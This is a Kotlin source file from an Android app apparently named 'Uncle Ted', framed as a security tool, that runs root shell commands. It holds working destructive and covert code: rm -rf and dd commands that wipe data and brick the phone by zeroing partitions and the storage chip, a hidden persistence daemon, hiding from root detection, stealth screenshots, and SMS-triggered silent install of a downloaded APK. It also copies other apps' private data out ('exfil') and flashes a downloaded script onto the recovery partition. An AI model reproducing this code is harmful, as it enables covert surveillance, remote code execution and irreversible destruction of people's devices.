package com.hamoon.uncleted.util

import android.content.Context
import android.util.Log
import com.hamoon.uncleted.data.SecurityPreferences
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File

/**
 * RootActions: The "God Mode" Engine.
 * This class translates high-level security intents into raw Linux Kernel/Shell commands.
 * It bypasses standard Android API limitations by executing as UID 0 (Root).
 */
object RootActions {

    private const val TAG = "RootActions"

    // --- PATH CONSTANTS ---
    // Modern Root (Magisk/KernelSU/APatch)
    private const val MAGISK_BASE = "/data/adb"
    private const val MAGISK_MODULES_DIR = "$MAGISK_BASE/modules"
    private const val MAGISK_SERVICE_DIR = "$MAGISK_BASE/service.d"

    // Legacy Root (SuperSU)
    private const val LEGACY_INIT_D = "/system/etc/init.d"

    // System Paths
    private const val SYSTEM_PRIV_APP = "/system/priv-app"

    /**
     * WIPE LEVELS: Defines the severity of the destruction protocol.
     */
    enum class WipeLevel {
        STANDARD_WIPE,             // Level 1: Safe Factory Reset (Handled by DeviceAdmin usually)
        FAST_USERDATA,             // Level 2: Secure Data Shred
        SECURE_HEADER_DESTRUCTION, // Alias for Level 2 or enhanced variant
        SYSTEM_DESTRUCTION,        // Level 3: OS Suicide (Soft Brick)
        NUCLEAR_WINTER             // Level 4: Partition Destruction (Hard Brick Risk)
    }

    /**
     * COMPATIBILITY WRAPPER: Used by UsbTripwireService
     * Maps the old function call to the Level 2 protocol.
     */
    suspend fun performSecureWipePlus(context: Context) {
        executeWipeProtocol(context, WipeLevel.FAST_USERDATA)
    }

    /**
     * COMPATIBILITY WRAPPER: Used by SmsCommandReceiver
     */
    suspend fun rebootDevice(context: Context) {
        Log.w(TAG, "ROOT: Remote REBOOT initiated.")
        EventLogger.log(context, "ROOT: Remote reboot command executed.")
        val result = RootExecutor.run("reboot")
        if (!result.isSuccess) {
            RootExecutor.run("/system/bin/reboot")
        }
    }

    /**
     * Executes the chosen destruction protocol.
     */
    suspend fun executeWipeProtocol(context: Context, level: WipeLevel) = withContext(Dispatchers.IO) {
        Log.e(TAG, "ROOT: INITIATING DESTRUCTION PROTOCOL - LEVEL: $level")
        EventLogger.log(context, "ROOT: EXECUTING WIPE LEVEL: $level")

        // 1. Cut Comms (Except for Standard Wipe where we might want to let the OS handle shutdown cleanly)
        if (level != WipeLevel.STANDARD_WIPE) {
            blockAllNetworkTraffic(context)
        }

        // 2. Execute Specific Protocol
        when (level) {
            WipeLevel.STANDARD_WIPE -> {
                // This is a fallback if DeviceAdmin failed but we have root.
                // Standard recovery wipe command.
                RootExecutor.run("reboot recovery --wipe_data")
            }

            WipeLevel.FAST_USERDATA, WipeLevel.SECURE_HEADER_DESTRUCTION -> {
                // LEVEL 2: The "Secure Data Shred". Targets User Data but keeps OS alive.

                // A. Delete accessible files first
                RootExecutor.run("rm -rf /data/media/*")
                RootExecutor.run("rm -rf /data/data/*")

                // B. Target FBE (File Based Encryption) Headers
                val targets = listOf(
                    "/dev/block/bootdevice/by-name/metadata",
                    "/dev/block/by-name/metadata",
                    "/dev/block/bootdevice/by-name/userdata",
                    "/dev/block/by-name/userdata"
                )

                targets.forEach { path ->
                    val check = RootExecutor.run("ls $path")
                    if (check.isSuccess) {
                        // Write 100MB of zeros to kill encryption keys
                        RootExecutor.run("dd if=/dev/zero of=$path bs=1048576 count=100 conv=fsync")
                    }
                }

                // C. Reboot to recovery to finish formatting
                RootExecutor.run("reboot recovery")
            }

            WipeLevel.SYSTEM_DESTRUCTION -> {
                // LEVEL 3: OS Suicide. Deletes the OS. Device hangs at boot logo.
                remountSystemReadWrite()

                // Delete critical OS binaries
                RootExecutor.run("rm -rf /system/bin")
                RootExecutor.run("rm -rf /system/framework")
                RootExecutor.run("rm -rf /vendor/bin")
                RootExecutor.run("rm /system/build.prop")

                // Also wipe data
                RootExecutor.run("rm -rf /data/*")

                // Force reboot
                RootExecutor.run("reboot")
            }

            WipeLevel.NUCLEAR_WINTER -> {
                // LEVEL 4: Scorched Earth. Destroys Partition Table.

                val qualcommPartitions = RootExecutor.run("ls /dev/block/bootdevice/by-name/").output
                val genericPartitions = RootExecutor.run("ls /dev/block/by-name/").output
                val allPartitions = (qualcommPartitions + genericPartitions).distinct().filter { it.isNotBlank() }

                if (allPartitions.isNotEmpty()) {
                    allPartitions.forEach { partName ->
                        // Don't waste time on small partitions, hit the big ones slightly
                        val qPath = "/dev/block/bootdevice/by-name/$partName"
                        val gPath = "/dev/block/by-name/$partName"
                        // 4MB overwrite per partition header
                        val cmd = "dd if=/dev/zero bs=4096 count=1000 conv=fsync of="
                        try { Runtime.getRuntime().exec(arrayOf("su", "-c", "$cmd$qPath")) } catch (_: Exception) {}
                        try { Runtime.getRuntime().exec(arrayOf("su", "-c", "$cmd$gPath")) } catch (_: Exception) {}
                    }
                }

                // The Killing Blow: Overwrite the start of the physical block device (GPT/MBR)
                // Writing ~20MB to the start of the storage chip
                RootExecutor.run("dd if=/dev/zero of=/dev/block/mmcblk0 bs=4096 count=5000 conv=fsync")

                // Reboot to bootloader (Fastboot) because OS is gone
                RootExecutor.run("reboot bootloader")
            }
        }
    }

    suspend fun convertToSystemApp(context: Context): Boolean = withContext(Dispatchers.IO) {
        val pm = context.packageManager
        val appInfo = pm.getApplicationInfo(context.packageName, 0)
        val sourceApk = appInfo.sourceDir
        val pkgName = context.packageName

        Log.i(TAG, "ROOT: Starting System App Conversion for $pkgName")

        val magiskCheck = RootExecutor.run("ls -d $MAGISK_MODULES_DIR")
        if (magiskCheck.isSuccess) {
            val moduleId = "uncleted_sys"
            val modulePath = "$MAGISK_MODULES_DIR/$moduleId"
            val sysPath = "$modulePath/system/priv-app/$pkgName"

            val commands = mutableListOf<String>()
            commands.add("mkdir -p $sysPath")
            commands.add("cp \"$sourceApk\" \"$sysPath/$pkgName.apk\"")
            commands.add("chmod -R 755 $modulePath")
            commands.add("chmod 644 \"$sysPath/$pkgName.apk\"")
            commands.add("chown -R 0:0 $modulePath")
            commands.add("echo 'id=$moduleId' > $modulePath/module.prop")
            commands.add("echo 'name=Uncle Ted Persistence' >> $modulePath/module.prop")
            commands.add("echo 'version=v1.0' >> $modulePath/module.prop")
            commands.add("echo 'versionCode=1' >> $modulePath/module.prop")
            commands.add("echo 'description=System App Persistence' >> $modulePath/module.prop")
            commands.add("touch $modulePath/auto_mount")

            val result = RootExecutor.runMultiple(commands)
            if (result.all { it.isSuccess }) {
                EventLogger.log(context, "ROOT: Magisk Persistence Module created. Reboot required.")
                return@withContext true
            }
        }

        // Legacy Fallback
        val mountResult = remountSystemReadWrite()
        if (!mountResult) return@withContext false

        val targetDir = "$SYSTEM_PRIV_APP/$pkgName"
        val targetApk = "$targetDir/$pkgName.apk"

        val legacyCommands = listOf(
            "mkdir -p $targetDir",
            "cp \"$sourceApk\" \"$targetApk\"",
            "chmod 755 $targetDir",
            "chmod 644 \"$targetApk\"",
            "chown 0:0 \"$targetApk\"",
            "chcon u:object_r:system_file:s0 \"$targetDir\"",
            "chcon u:object_r:system_file:s0 \"$targetApk\""
        )

        val legacyResult = RootExecutor.runMultiple(legacyCommands)
        RootExecutor.run("mount -o ro,remount /system")
        RootExecutor.run("mount -o ro,remount /")

        if (legacyResult.all { it.isSuccess }) return@withContext true

        return@withContext false
    }

    /**
     * Used by FeaturesFragment
     */
    suspend fun toggleUnkillableService(context: Context, enable: Boolean): Boolean = withContext(Dispatchers.IO) {
        val pkgName = context.packageName
        val serviceName = "$pkgName.services.MonitoringService"
        val scriptName = "99uncleted_daemon"

        if (!enable) {
            // Remove
            RootExecutor.run("rm $MAGISK_SERVICE_DIR/$scriptName.sh")
            remountSystemReadWrite()
            RootExecutor.run("rm $LEGACY_INIT_D/$scriptName")
            return@withContext true
        }

        val scriptContent = """
            #!/system/bin/sh
            # Uncle Ted Persistence Daemon
            sleep 20
            while true; do
                if pm list packages | grep -q $pkgName; then
                    if ! pgrep -f $pkgName > /dev/null; then
                        am start-foreground-service -n $pkgName/$serviceName --es REASON "PERSISTENCE_DAEMON"
                    fi
                    settings put secure enabled_accessibility_services $pkgName/.services.PowerButtonService
                    settings put secure accessibility_enabled 1
                fi
                sleep 10
            done
        """.trimIndent()

        val magiskServiceCheck = RootExecutor.run("ls -d $MAGISK_SERVICE_DIR")
        val targetPath = if (magiskServiceCheck.isSuccess) {
            "$MAGISK_SERVICE_DIR/$scriptName.sh"
        } else {
            remountSystemReadWrite()
            RootExecutor.run("mkdir -p $LEGACY_INIT_D")
            "$LEGACY_INIT_D/$scriptName"
        }

        val commands = listOf(
            "echo \"$scriptContent\" > \"$targetPath\"",
            "chmod 755 \"$targetPath\"",
            "chown 0:0 \"$targetPath\""
        )

        val result = RootExecutor.runMultiple(commands)
        if (result.all { it.isSuccess }) {
            EventLogger.log(context, "ROOT: Unkillable Daemon installed to $targetPath")
            return@withContext true
        }
        return@withContext false
    }

    /**
     * Used by FeaturesFragment
     */
    suspend fun toggleProcessHiding(context: Context, enable: Boolean): Boolean {
        val packageName = context.packageName
        // Try Magisk DenyList (Modern)
        var cmd = if (enable) "magisk --denylist add $packageName" else "magisk --denylist rm $packageName"
        var result = RootExecutor.run(cmd)

        if (!result.isSuccess) {
            // Try Legacy MagiskHide
            cmd = if (enable) "magiskhide add $packageName" else "magiskhide rm $packageName"
            result = RootExecutor.run(cmd)
        }
        return result.isSuccess
    }

    suspend fun blockAllNetworkTraffic(context: Context) {
        val rules = listOf(
            "iptables -F",
            "ip6tables -F",
            "iptables -P INPUT DROP",
            "iptables -P OUTPUT DROP",
            "iptables -P FORWARD DROP",
            "ip6tables -P INPUT DROP",
            "ip6tables -P OUTPUT DROP",
            "ip6tables -P FORWARD DROP"
        )
        RootExecutor.runMultiple(rules)
        EventLogger.log(context, "ROOT: Network Firewall Active (IPTABLES DROP).")
    }

    suspend fun takeStealthScreenshot(context: Context): File? = withContext(Dispatchers.IO) {
        val tempDir = "/data/local/tmp"
        val fileName = "sc_${System.currentTimeMillis()}.png"
        val tempFile = "$tempDir/$fileName"
        val finalFile = File(context.filesDir, fileName)

        val capResult = RootExecutor.run("screencap -p \"$tempFile\"")

        if (capResult.isSuccess) {
            val mvResult = RootExecutor.run("mv \"$tempFile\" \"${finalFile.absolutePath}\"")
            if (mvResult.isSuccess) {
                RootExecutor.run("chmod 600 \"${finalFile.absolutePath}\"")
                return@withContext finalFile
            }
        }
        return@withContext null
    }

    /**
     * Used by SmsCommandReceiver
     */
    suspend fun performSilentInstall(context: Context) {
        val apkUrl = SecurityPreferences.getRemoteApkUrl(context) ?: return
        val tempApkPath = "/data/local/tmp/remote_install.apk"

        val downloadResult = RootExecutor.run("curl -L -o $tempApkPath \"$apkUrl\"")
        if (downloadResult.isSuccess) {
            val installResult = RootExecutor.run("pm install -r $tempApkPath")
            if (installResult.isSuccess) {
                EventLogger.log(context, "ROOT: Silent install successful.")
            }
            RootExecutor.run("rm $tempApkPath")
        }
    }

    /**
     * Used by SmsCommandReceiver
     */
    suspend fun exfiltrateAppData(context: Context, targetPkg: String, path: String): File? = withContext(Dispatchers.IO) {
        val source = "/data/data/$targetPkg/$path"
        val dest = File(context.filesDir, "exfil_${targetPkg}_${File(path).name}")

        if (RootExecutor.run("cat $source > ${dest.absolutePath}").isSuccess) {
            RootExecutor.run("chmod 666 ${dest.absolutePath}")
            return@withContext dest
        }
        return@withContext null
    }

    /**
     * Used by FeaturesFragment
     */
    suspend fun flashResetSurvivalLoader(context: Context): Boolean = withContext(Dispatchers.IO) {
        val loaderUrl = SecurityPreferences.getLoaderScriptUrl(context)
        if (loaderUrl.isNullOrEmpty()) return@withContext false

        val tempScriptPath = "/data/local/tmp/loader.sh"
        val targetPartition = "/dev/block/bootdevice/by-name/recovery" // Dangerous Hardcoding

        if (RootExecutor.run("curl -L -o $tempScriptPath '$loaderUrl'").isSuccess) {
            EventLogger.log(context, "ROOT: DANGER - Flashing recovery partition.")
            val flashResult = RootExecutor.run("dd if=$tempScriptPath of=$targetPartition")
            RootExecutor.run("rm $tempScriptPath")
            return@withContext flashResult.isSuccess
        }
        return@withContext false
    }

    private suspend fun remountSystemReadWrite(): Boolean {
        if (RootExecutor.run("mount -o rw,remount /system").isSuccess) return true
        if (RootExecutor.run("mount -o rw,remount /").isSuccess) return true
        val remountBin = RootExecutor.run("remount")
        if (remountBin.isSuccess) return true
        return false
    }

    suspend fun setMockLocationConfig(context: Context, enable: Boolean) {
        val value = if (enable) "1" else "0"
        RootExecutor.run("settings put secure mock_location $value")
        val pkg = context.packageName
        val opMode = if (enable) "allow" else "deny"
        RootExecutor.run("appops set $pkg MOMOCK_LOCATION $opMode")
        RootExecutor.run("appops set $pkg android:mock_location $opMode")
    }

    /**
     * Updated signature to match usage in AdvancedCameraHandler
     * (accepts Boolean to match existing code, but ignores it or uses it)
     */
    suspend fun suppressPrivacyIndicators(suppress: Boolean = true) {
        if (suppress) {
            // Aggressively kill camera server to reset indicators
            RootExecutor.run("killall cameraserver")
        }
    }
}